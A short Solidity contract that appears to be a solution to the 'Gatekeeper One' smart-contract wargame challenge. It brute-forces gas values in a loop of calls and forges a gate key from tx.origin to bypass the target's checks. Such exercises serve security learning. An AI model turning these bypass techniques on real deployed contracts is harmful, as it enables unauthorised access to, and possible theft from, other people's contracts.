// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneExploit {
    function attack(address target) external {
        bytes8 key = generateKey();

        // Try a range of gas values to pass gateTwo
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = target.call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
    }

    function generateKey() internal view returns (bytes8) {
        // Lower 2 bytes of your EOA address (tx.origin)
        uint16 low16 = uint16(uint160(tx.origin));

        // Build a key where:
        // - lower 32 bits = low16 (padded with 0)
        // - full 64 bits != lower 32 bits
        uint64 key = uint64(uint32(low16));         // lower 4 bytes OK
        key |= (1 << 63);                            // force upper bits so full 64-bit key != 32-bit

        return bytes8(key);
    }
}
